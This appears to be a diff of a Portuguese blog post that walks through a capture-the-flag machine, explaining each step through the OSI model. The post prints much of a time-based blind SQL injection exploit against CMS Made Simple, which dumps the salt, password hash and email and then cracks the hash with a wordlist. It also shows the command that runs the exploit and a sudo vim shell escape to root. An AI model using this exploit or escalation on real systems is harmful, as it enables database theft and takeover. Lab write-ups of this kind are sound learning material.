+</span></span></code></pre></div><p>Após a definição dos argumentos do Parser é realizada uma verificação, caso a url passada pelo usuário seja válida. Se for inválida, é lançado no output do terminal um script com instruções de ajuda e finaliza a execução do exploit, porque é necessário que esses dados estejam corretos, para que a conexão HTTP ocorra, garantindo a Camada de Aplicação o recebimento das informações adequadamente.</p>
+<h3 id="variáveis">Variáveis</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">url_vuln</span> <span class="o">=</span> <span class="n">options</span><span class="o">.</span><span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;/moduleinterface.php?mact=News,m1_,default,0&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">dictionary</span> <span class="o">=</span> <span class="s1">&#39;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl"><span class="n">password</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">temp_password</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">TIME</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">db_name</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">output</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">email</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">salt</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">wordlist</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span></code></pre></div><p>Nesse estágio do exploit são definidas as variáveis que constituem o ataque:</p>
+<ul>
+<li><strong>url_vuln</strong>: O alvo do ataque que são a url principal e o endpoint vulnerável. Consequentemente é definido o recurso no servidor web alvo que será possivelmente acessado e também explorado. Além disso, são feitas requisições HTTP, que atuam na camada de aplicação.</li>
+<li><strong>session</strong>: É criada uma sessão HTTP, que mesmo após o servidor processar a requisição e enviar de volta a resposta, a mesma não é fechada e garante ao cliente uma nova requisição. A camada de sessão se faz presente para que seja possível gerenciar a persistência dessas conexões HTTP.</li>
+<li><strong>dictionary</strong>: São os caracteres que serão usados para a força bruta. Através desses conjuntos de caracteres usados nesse processo de força bruta terá uma estrutura específica, tanto hexadecimal, para que seja possível gerar os payloads do SQL Injection, quanto hash MD5 e as senhas possam ser comparadas durante a quebra. Portanto, ocorre uma manipulação e também conversão dos dados, no qual a camada de apresentação lida, ou seja, transformando esses formatos de dados entre o sistema e a rede.</li>
+<li><strong>flag</strong>: Variável utilizada em relação a controle, para que ao ser usada em loops possa determinar se o processo da extração de dados deve continuar ou não.</li>
+<li><strong>password</strong>:  Tem como objetivo armazenar a senha que será extraída do banco de dados no processo de SQL Injection. Dentro dessa perspectiva, esse campo também retrata uma etapa da apresentação quanto as possibilidades da senha ser convertida para diversos formatos e ser autenticada e quando isso ocorre se torna parte das credenciais usadas para o acesso de sistema do alvo, por parte da aplicação.</li>
+<li><strong>temp_password</strong>: É um campo temporário que busca construir e também testar as possíveis combinações de caracteres das hashes no processo de extração da senha. Esses valores são justamente manipulados e também testados contra a url vulnerável do servidor web.</li>
+<li><strong>TIME</strong>: Define o atraso em segundos que serão necessários para que seja validado o SQL Injection. Caso o tempo de resposta seja maior do que a definida, isso irá indicar que o payload foi realizado.</li>
+<li><strong>db_name</strong>: Armazenamento de nome de usuário do banco de dados obtido através do SQL Injection. Mais uma vez a camada de apresentação se faz presente por se tratar de um dado que pode ser convertido para diversos formatos durante a extração e apresentação, alem de ser uma informação da aplicação alvo.</li>
+<li><strong>email</strong>: Armazenamento do e-mail capturado do banco de dados do servidor web  e por consequência também pode ser formatado ou validado antes de ser exibido na apresentação desse dado.</li>
+<li><strong>salt</strong>: É um valor utilizado para proteger as senhas no banco de dados. É necessário tentar extrair esse valor, para que seja possível realizar ataques de força bruta nas senhas. Como resultado, é parte da apresentação por ser manipulado e processado em formato hash MD5, antes de ocorrer a comparação ao hash das senhas armazenadas.</li>
+<li><strong>wordlist</strong>: Essa variável armazena o diretório/caminho fornecido pelo usuário para um arquivo com uma lista de palavras que serão usadas como possíveis senhas e testadas em comparativo com a hash da senha combinado em conjunto com o salt. Essas palavras que serão listadas são processadas e também manipuladas, pois são relacionadas ao salt e após isso convertidas para hashes MD5, antes de serem de fato comparadas com a hash da senha armazenada.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">wordlist</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">wordlist</span> <span class="o">+=</span> <span class="n">options</span><span class="o">.</span><span class="n">wordlist</span>
+</span></span></code></pre></div><p>É importante ressaltar que essa condição apresentada acima após a definição das variáveis verifica se o usuário forneceu um caminho para o o arquivo de wordlist através do argumento definido pelo <strong>optparse</strong>. Caso tenha sido passado, o mesmo é adicionado a variável wordlist e a mesma passa a ter o diretório completo do arquivo que será usado para força bruta.</p>
+<h3 id="função-crack_password">Função crack_password</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">crack_password</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">password</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">output</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">wordlist</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">salt</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">dict</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">wordlist</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">dict</span><span class="o">.</span><span class="n">readlines</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">        <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">beautify_print_try</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">salt</span><span class="p">)</span> <span class="o">+</span> <span class="n">line</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="n">password</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">output</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[+] Password cracked: &#34;</span> <span class="o">+</span> <span class="n">line</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">dict</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></div><p>Essa função basicamente lê a wordlist linha por linha e também combina cada entrada com o salt do banco de dados. Desse modo, também gera o hash MD5 para que seja possível comparar com a senha encontrada no banco de dados. Logo, esse processo é uma manipulação de dados criptográficos presente na apresentação.</p>
+<h3 id="função-dump_salt">Função dump_salt</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dump_salt</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">flag</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">salt</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">output</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ord_salt</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ord_salt_temp</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">flag</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">flag</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">dictionary</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">temp_salt</span> <span class="o">=</span> <span class="n">salt</span> <span class="o">+</span> <span class="n">dictionary</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ord_salt_temp</span> <span class="o">=</span> <span class="n">ord_salt</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">dictionary</span><span class="p">[</span><span class="n">i</span><span class="p">]))[</span><span class="mi">2</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">            <span class="n">beautify_print_try</span><span class="p">(</span><span class="n">temp_salt</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;a,b,1,5))+and+(select+sleep(&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">TIME</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;)+from+cms_siteprefs+where+sitepref_value+like+0x&#34;</span> <span class="o">+</span> <span class="n">ord_salt_temp</span> <span class="o">+</span> <span class="s2">&#34;25+and+sitepref_name+like+0x736974656d61736b)+--+&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">url</span> <span class="o">=</span> <span class="n">url_vuln</span> <span class="o">+</span> <span class="s2">&#34;&amp;m1_idlist=&#34;</span> <span class="o">+</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl">            <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">elapsed_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start_time</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">elapsed_time</span> <span class="o">&gt;=</span> <span class="n">TIME</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">flag</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">flag</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">salt</span> <span class="o">=</span> <span class="n">temp_salt</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ord_salt</span> <span class="o">=</span> <span class="n">ord_salt_temp</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">    <span class="n">output</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">[+] Salt for password found: &#39;</span> <span class="o">+</span> <span class="n">salt</span>
 </span></span></code></pre></div><p>A função dump_salt realiza o processo de construção dos payloads SQL de maneira repetida para que seja possível capturar o salt, pois sem o salt não é possível conseguir as credenciais. Tanto que nesse momento, pode ser visto bem a interação por parte da camada 6, porque ocorre manipulação dos caracteres com a função hex(), em conjunto com a ord() e o envio
 desses payloads HTTP para a camada de aplicação.
-Uma questão importante é que o mesmo processo acontece nas outras funções, como a <strong>dump_password</strong>, <strong>dump_username</strong> e <strong>dump_email</strong>. A construção dos payloads, que é gerada por cada função em busca de um valor específico, a requisição de envio, que é justamente o mesmo endpoint, para obter as informações dessa aplicação vulnerável. Um ponto interessante é como a camada de apresentação faz a manipulação desses dados para os formatos necessários, seja de conversão para hexadecimal e construir os payloads, quanto o ato de unir esses caracteres e refazer essas informações que foram obtidas.</p><p>Por fim, para que seja possível iniciar esse exploit é necessário o python2:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl https://bootstrap.pypa.io/pip/2.7/get-pi.py -o get-pip.py
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>python2 get-pip.py
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>python2 -m pip --version 
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>python -m pip install requests
-</span></span><span class=line><span class=cl>python2 -m pip install --upgrade pip setuptools
-</span></span><span class=line><span class=cl>python2 -m pip install termcolor
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>python2 exploit.py -u <span class=s2>&#34;http://IP/simple&#34;</span> -c -w /usr/share/wordlists/dirb/rockyou.txt
-</span></span></code></pre></div><h2 id=comprometimento>Comprometimento</h2><h3 id=ssh>SSH</h3><p>O Secure Shell (SSH) é um protocolo que utiliza criptografia para que seja possível estabelecer conexões remotas de forma segura entre computadores.</p><p><img src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/yel1s1xx395g8roop083.png alt="SSH Authentication">
+Uma questão importante é que o mesmo processo acontece nas outras funções, como a <strong>dump_password</strong>, <strong>dump_username</strong> e <strong>dump_email</strong>. A construção dos payloads, que é gerada por cada função em busca de um valor específico, a requisição de envio, que é justamente o mesmo endpoint, para obter as informações dessa aplicação vulnerável. Um ponto interessante é como a camada de apresentação faz a manipulação desses dados para os formatos necessários, seja de conversão para hexadecimal e construir os payloads, quanto o ato de unir esses caracteres e refazer essas informações que foram obtidas.</p>
+<p>Por fim, para que seja possível iniciar esse exploit é necessário o python2:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl https://bootstrap.pypa.io/pip/2.7/get-pi.py -o get-pip.py
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">python2 get-pip.py
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">python2 -m pip --version 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">python -m pip install requests
+</span></span><span class="line"><span class="cl">python2 -m pip install --upgrade pip setuptools
+</span></span><span class="line"><span class="cl">python2 -m pip install termcolor
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">python2 exploit.py -u <span class="s2">&#34;http://IP/simple&#34;</span> -c -w /usr/share/wordlists/dirb/rockyou.txt
+</span></span></code></pre></div><h2 id="comprometimento">Comprometimento</h2>
+<h3 id="ssh">SSH</h3>
+<p>O Secure Shell (SSH) é um protocolo que utiliza criptografia para que seja possível estabelecer conexões remotas de forma segura entre computadores.</p>
+<p><img src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/yel1s1xx395g8roop083.png" alt="SSH Authentication">
 A ideia principal é entender o funcionamento do protocolo SSH durante a invasão. O primeiro ponto é estar principalmente na camada de aplicação, por ser um protocolo criado para que essas conexões ocorram de maneira mais segura ao acessar o servidor web do alvo via SSH, existem dois pontos importantes: A <strong>autenticação</strong>, no caso do usuário Mitch e a <strong>sessão remota</strong>, que é o acesso ao sistema operacional no servidor, que no caso é Ubuntu (Linux), com isso é possível usar comandos, executar processo, etc.
-O protocolo SSH perpassa também outras camadas como a de transporte, para que seja possível uma conexão confiável entre cliente e servidor, assim o protocolo TCP se faz presente mais uma vez. A camada de Rede em virtude do protocolo IP, que já foi visto anteriormente e o de <strong>enlace</strong>, porque o protocolo depende dessa camada para que os dados sejam enviados corretamente entre os dispositivos físicos na rede, <strong>algo como &ldquo;encapsulamento&rdquo; desses dados, mas não um encapsulamento em definitivo</strong>.</p><p>Quanto ao processo do alvo até a flag existem três pontos legais:</p><ul><li>Além do Mitch, existem um segundo usuário que é a resposta para o: Is there any other user in the home directory? What&rsquo;s its name?</li><li>A captura da primeira flag <strong>user.txt</strong>.</li><li>Com o comando <strong>sudo -l</strong> é possível mostrar os privilégios do usuário atual, no caso do Mitch e o mesmo pode executar o comando vim no diretório <strong>/usr/bin</strong> com o máximo de privilégio no sistema. É através desse comando que se tem a resposta para o: What can you leverage to spawn a privileged shell?. E em consequência a elevação de privilégios e acesso a última flag.</li></ul><h2 id=elevação-de-privilégios>Elevação de privilégios</h2><p>Por fim, para realizar e ter acesso a última flag é basicamente utilizar o comando de acesso ao vim e já incrementando uma opção que possa viabilizar a execução do comando <strong>bash</strong> e ter acesso ao servidor web como root.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo /usr/bin/vim -c <span class=s2>&#34;:!bash&#34;</span>
-</span></span></code></pre></div><p><img src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/n1tjc31ljx1zw93f3ybm.png alt="Privilege Escalation">
-Portanto, foi possível ter acesso ao root e a última flag dessa máquina e mantendo assim um ciclo de ataques, numa perspectiva mais simples de um invasor. Algo que já foi construído no texto mencionado mais acima: <a href=https://dev.to/obtuosa/maquina-valley-do-tryhackme-e-o-ciclo-de-vida-de-um-ciberataque-mp6><strong>Máquina Valley do TryHackMe e o ciclo de vida de um ciberataque</strong></a></p><h2 id=conclusão>Conclusão</h2><p>O princípio maior dessa máquina foi justamente ter um pouco de compreensão da interação entre as camadas , com foco no modelo OSI e observar o funcionamento, para além dos conceitos já existentes. Desde a camada de aplicação, no qual é o mais próximo do cliente e assim destrinchar os caminhos traçados, seja com ferramentas como nmap e ffuf, além de protocolos como IP, TCP, SSH e outros conceitos que foram abordados no decorrer do processo. Muitas vezes, nos prendemos a teoria e deixamos de lado a parte prática, que é justamente um fator importante para o processo de aprendizado.
-Te vejo na próxima jornada!</p></div></article></main></div><footer class=footer><span class=footer_item></span>&nbsp;<div class=footer_social-icons><a href=https://github.com/obtuosa target=_blank rel="noopener noreferrer me" title=Github><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg>
-</a><a href=/index.xml target=_blank rel="noopener noreferrer me" title=Rss><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></div><small class=footer_copyright>© 2025 .
-Powered by <a href=https://github.com/hugo-sid/hugo-blog-awesome target=_blank rel=noopener>Hugo blog awesome</a>.</small></footer><a href=# title="Go to top" id=totop><svg width="48" height="48" fill="currentcolor" stroke="currentcolor" viewBox="0 96 960 960"><path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197z"/></svg>
-</a><script src=https://obtuosa.github.io/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30+lSNuSkl4QXuNyy8="></script></body></html>
+O protocolo SSH perpassa também outras camadas como a de transporte, para que seja possível uma conexão confiável entre cliente e servidor, assim o protocolo TCP se faz presente mais uma vez. A camada de Rede em virtude do protocolo IP, que já foi visto anteriormente e o de <strong>enlace</strong>, porque o protocolo depende dessa camada para que os dados sejam enviados corretamente entre os dispositivos físicos na rede, <strong>algo como &ldquo;encapsulamento&rdquo; desses dados, mas não um encapsulamento em definitivo</strong>.</p>
+<p>Quanto ao processo do alvo até a flag existem três pontos legais:</p>
+<ul>
+<li>Além do Mitch, existem um segundo usuário que é a resposta para o: Is there any other user in the home directory? What&rsquo;s its name?</li>
+<li>A captura da primeira flag <strong>user.txt</strong>.</li>
+<li>Com o comando <strong>sudo -l</strong> é possível mostrar os privilégios do usuário atual, no caso do Mitch e o mesmo pode executar o comando vim no diretório <strong>/usr/bin</strong> com o máximo de privilégio no sistema. É através desse comando que se tem a resposta para o: What can you leverage to spawn a privileged shell?. E em consequência a elevação de privilégios e acesso a última flag.</li>
+</ul>
+<h2 id="elevação-de-privilégios">Elevação de privilégios</h2>
+<p>Por fim, para realizar e ter acesso a última flag é basicamente utilizar o comando de acesso ao vim e já incrementando uma opção que possa viabilizar a execução do comando <strong>bash</strong> e ter acesso ao servidor web como root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo /usr/bin/vim -c <span class="s2">&#34;:!bash&#34;</span>
+</span></span></code></pre></div><p><img src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/n1tjc31ljx1zw93f3ybm.png" alt="Privilege Escalation">
+Portanto, foi possível ter acesso ao root e a última flag dessa máquina e mantendo assim um ciclo de ataques, numa perspectiva mais simples de um invasor.  Algo que já foi construído no texto mencionado mais acima: <a href="https://dev.to/obtuosa/maquina-valley-do-tryhackme-e-o-ciclo-de-vida-de-um-ciberataque-mp6"><strong>Máquina Valley do TryHackMe e o ciclo de vida de um ciberataque</strong></a></p>
+<h2 id="conclusão">Conclusão</h2>
+<p>O princípio maior dessa máquina foi justamente ter um pouco de compreensão da interação entre as camadas , com foco no modelo OSI e observar o funcionamento, para além dos conceitos já existentes. Desde a camada de aplicação, no qual é o mais próximo do cliente e assim destrinchar os caminhos traçados, seja com ferramentas como nmap e ffuf, além de protocolos como IP, TCP, SSH e outros conceitos que foram abordados no decorrer do processo. Muitas vezes, nos prendemos a teoria e deixamos de lado a parte prática, que é justamente um fator importante para o processo de aprendizado.
+Te vejo na próxima jornada!</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/obtuosa" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="/index.xml" target="_blank" rel="noopener noreferrer me"
+    title="Rss">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M4 11a9 9 0 0 1 9 9" />
+    <path d="M4 4a16 16 0 0 1 16 16" />
+    <circle cx="5" cy="19" r="1" />
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2025 .
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js" ></script>
+
+    
+
+</body>
+</html>
